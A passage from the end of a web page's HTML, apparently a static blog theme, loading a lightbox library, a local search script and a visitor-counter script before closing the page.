src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
